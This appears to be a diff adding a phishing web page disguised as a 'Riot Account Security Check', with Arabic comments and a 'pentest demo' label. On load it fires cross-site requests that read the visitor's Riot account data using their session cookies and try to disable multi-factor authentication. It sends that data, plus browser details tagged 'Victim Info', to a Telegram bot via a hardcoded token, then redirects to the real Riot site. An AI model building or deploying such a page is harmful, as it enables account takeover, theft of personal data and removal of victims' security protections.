@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Riot Account Security Check</title>
+    <style>
+        body { font-family: Arial; max-width: 400px; margin: 50px auto; }
+        .riot-logo { text-align: center; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #00a300; color: white; border: none; font-size: 16px; cursor: pointer; }
+        .loading { display: none; text-align: center; color: green; }
+    </style>
+</head>
+<body>
+    <div class="riot-logo">🔒 Riot Account Verification</div>
+    <p>تحقق من حسابك للأمان (pentest demo).</p>
+    
+    <!-- CSRF لسرقة user data -->
+    <iframe style="display:none" onload="stealUserData()"></iframe>
+    
+    <button onclick="verifyAccount()">Verify Account</button>
+    <div id="loading" class="loading">جاري التحقق... ✅</div>
+    
+    <script>
+    const BOT_TOKEN = '6157757749:AAEHVW7rzzTDLkPftRb5bTC8wfQuQlEKB1U';  // غيّر هنا
+    const CHAT_ID = '6157757749';     // غيّر هنا
+    
+    function stealUserData() {
+        // CSRF لـ /api/account/v1/user (يسرق بيانات لو مسجل دخول)
+        fetch('https://account.riotgames.com/api/account/v1/user', {
+            credentials: 'include',  // cookies/session
+            method: 'GET'
+        })
+        .then(res => res.json())
+        .then(data => sendToTelegram('User Data: ' + JSON.stringify(data)))
+        .catch(() => {});
+        
+        // CSRF disable MFA
+        fetch('https://account.riotgames.com/api/mfa/v2/disable', {
+            method: 'POST',
+            credentials: 'include'
+        }).catch(() => {});
+    }
+    
+    function verifyAccount() {
+        document.getElementById('loading').style.display = 'block';
+        
+        // سرقة بيانات browser + IP
+        const info = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            ip: '',  // optional fetch IP
+            timestamp: new Date().toISOString()
+        };
+        
+        sendToTelegram('Victim Info: ' + JSON.stringify(info));
+        
+        // redirect للصفحة الحقيقية
+        setTimeout(() => {
+            window.location = 'https://account.riotgames.com/';
+        }, 2000);
+    }
+    
+    function sendToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    }
+    
+    // Auto-trigger CSRF لما يحمل الصفحة
+    window.onload = stealUserData;
+    </script>
+</body>
+</html>
